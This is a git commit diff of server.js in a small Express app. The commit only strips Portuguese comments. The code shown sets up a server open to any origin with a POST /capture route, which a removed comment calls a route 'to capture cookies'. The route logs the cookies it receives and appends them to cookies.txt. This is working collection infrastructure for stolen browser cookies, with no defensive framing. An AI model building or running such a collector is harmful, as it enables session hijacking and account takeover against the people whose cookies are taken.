ce8b5aa764d622f3e7f46e6528d19285782276b6
Anne Ingrid <103117810+anneingrid@users.noreply.github.com>
2024-11-28 15:38:52 -0300

    Update server.js

--- server.js
+++ server.js
@@ -5,18 +5,14 @@ const fs = require('fs');
 const app = express();
 const port = 3000;
 const path = require('path');
-// Permite requisições de qualquer origem (pode ser ajustado para domínios específicos)
 app.use(cors());
 
-// Usando o body-parser para processar o corpo das requisições como JSON
 app.use(bodyParser.json());
 
-// Rota para capturar cookies
 app.post('/capture', (req, res) => {
     const cookies = req.body.cookies;
     console.log('Cookies recebidos:', cookies);
 
-    // Armazenar os cookies em um arquivo
     fs.appendFile('cookies.txt', cookies + '\n', (err) => {
         if (err) {
             console.error('Erro ao salvar cookies:', err);
